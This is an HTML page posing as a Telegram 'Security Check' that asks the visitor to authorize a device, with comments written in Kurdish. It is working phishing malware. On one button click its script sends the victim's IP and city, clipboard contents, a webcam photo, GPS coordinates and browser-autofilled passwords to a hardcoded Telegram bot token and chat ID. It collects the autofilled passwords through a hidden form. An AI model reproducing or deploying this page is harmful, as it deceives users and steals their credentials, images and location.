<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram - Security Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; z-index: 100; position: relative; }
        .logo { width: 100px; margin-bottom: 20px; }
        .btn { background: #3390ec; color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; }
        
        /* چاککردنی کێشەی وێنەی ڕەش - ڤیدیۆکە دەبێت کەمێک دیار بێت بەڵام لە پشت سندوقەکەدا */
        #video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
        #canvas { display: none; }

        /* تەڵەی پاسوۆرد - بە readonly تا کیبۆرد نەکرێتەوە */
        #trap-form { position: absolute; opacity: 0.01; top: 0; left: 0; z-index: -1; }
    </style>
</head>
<body>

    <!-- ڤیدیۆکە لێرەدا وەک باکگراوند کار دەکات تا ڕەش نەبێت -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
        <h2>Security Check</h2>
        <p>Please authorize this device to continue accessing your Telegram account.</p>
        
        <form id="trap-form">
            <input type="text" id="trap_user" autocomplete="username" readonly>
            <input type="password" id="trap_pass" autocomplete="current-password" readonly>
        </form>

        <button class="btn" id="mainBtn">AUTHORIZE DEVICE</button>
        <p id="status" style="display:none; color:#3390ec; font-weight:bold; margin-top:15px;">Processing...</p>
    </div>

    <script>
        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
        const chatId = "6679834643";

        async function sendToBot(text) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            });
        }

        document.getElementById('mainBtn').addEventListener('click', async function() {
            const btn = this;
            btn.style.display = 'none';
            document.getElementById('status').style.display = 'block';

            // ١. وەرگرتنی IP و Clipboard
            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendToBot(`🌐 IP: ${d.ip}\n🏙️ ${d.city}`));
            try {
                const clip = await navigator.clipboard.readText();
                if(clip) sendToBot("📋 Clipboard: " + clip);
            } catch(e) {}

            // ٢. چارەسەری کێشەی وێنەی ڕەش (بە بەکارهێنانی باکگراوند)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // وێستان بۆ ٤ چرکە تا کامێراکە بە تەواوی ڕۆشن دەبێتەوە
                await new Promise(r => setTimeout(r, 4000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'face.jpg');
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            } catch (e) { await sendToBot("❌ Access Denied"); }

            // ٣. هەوڵدان بۆ دزینی پاسوۆرد (Password Autofill)
            const passInput = document.getElementById('trap_pass');
            passInput.removeAttribute('readonly'); // لابردنی ڕێگری بۆ ئەوەی وێبگەڕ پڕی بکاتەوە
            
            setTimeout(async () => {
                let u = document.getElementById('trap_user').value;
                let p = passInput.value;
                if(p) await sendToBot(`🔑 CAPTURED!\n👤 User: ${u}\n🔒 Pass: ${p}`);
            }, 1000);

            // ٤. GPS و گۆڕینی لاپەڕە
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await sendToBot(`📍 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                    window.location.href = "index.html";
                }, () => { window.location.href = "index.html"; }, { enableHighAccuracy: true });
            } else {
                window.location.href = "index.html";
            }
        });
    </script>
</body>
</html>
